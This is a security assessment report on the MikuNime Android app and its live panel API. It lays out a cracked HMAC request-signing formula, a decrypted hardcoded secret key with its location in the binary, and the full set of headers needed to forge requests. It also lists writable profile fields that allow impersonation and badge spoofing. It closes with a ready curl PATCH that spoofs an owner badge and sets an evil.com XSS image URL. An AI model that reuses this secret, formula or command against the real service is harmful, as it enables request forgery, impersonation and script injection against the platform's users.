# MikuNime Security Assessment Report v2
**Date:** 2026-09-11
**Target:** MikuNime Android APK v0.3.2
**API:** https://panel.mikunime.web.id
**Auth:** HMAC-SHA256 signed VPS token

---

## Executive Summary

MikuNime APK has critical authentication bypass, HMAC signing completely cracked, multiple mass assignment vulnerabilities, stored XSS via profile fields, SSRF via photo/banner URLs, IDOR on all user profiles, chat/notification injection, Firebase Auth email enumeration, and badge spoofing allowing users to display any badge including owner/admin/premium titles.

**Severity: CRITICAL**

---

## 1. Authentication & Signing — FULLY CRACKED

### Signing Formula (Verified 142/142)
```
h1_hex = HMAC-SHA256(pepper, fullToken + ":" + str(hour)).hexdigest()
sig = HMAC-SHA256(h1_hex.encode(), path + "|" + str(ts) + "|" + nonce).hexdigest()
```

### Pepper (XOR 0x5d Decrypted)
```
MikuSecureV3_YanzzMasterKey2026_UltraGuard
```
- Location: `libmiku.so` offset 0x44a68, 42 bytes
- XOR key: `0x5d`

### Headers Required
```
X-Miku-Signature: {sig}
X-Miku-Timestamp: {ts}
X-Miku-Nonce: {16-char hex}
X-Miku-Device-Id: {any}
X-Miku-Device-Model: {any}
X-Miku-Brand: {any}
X-Miku-OS-Version: {any}
Authorization: Bearer {token}
X-Miku-Auth: vps
```

### Token
```
miku_[REDACTED]
```

---

## 2. Mass Assignment — Profile Field Exploitation

### Writable Fields (Server Accepts)
| Field | Impact |
|---|---|
| `username` | Impersonate any user |
| `photoURL` | Any URL — GIF, PNG, XSS, SSRF |
| `banner` / `bannerURL` | Any URL — video, GIF, image |
| `equippedBadge` | ANY string (including fake badges) |
| `equippedBannerIsVideo` | `true`/`false` |
| `equippedBannerUrl` | Video URL |
| `notifEnabled` | `true`/`false` |

### Server-Locked Fields (Ignored on PATCH)
| Field | Returns |
|---|---|
| `role` | Always `user` |
| `level` | Always `1` |
| `xp` | Always `0` |
| `mikuPoint` | Always `0` |
| `isVip` | Always `False` |
| `ownedBadges` | Always `[]` |
| `collectionValue` | Always `0` |
| `email` | Leaked via IDOR |

# EXECUTION TRACE — Profile Manipulation
```bash
curl -X PATCH https://panel.mikunime.web.id/api/miku/7/9/me/profile \
  -H "Authorization: Bearer miku_[REDACTED]" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"username":"Yanzz X MikuNime","equippedBadge":"owner_badge","photoUrl":"https://evil.com/xss.gif"}'
```

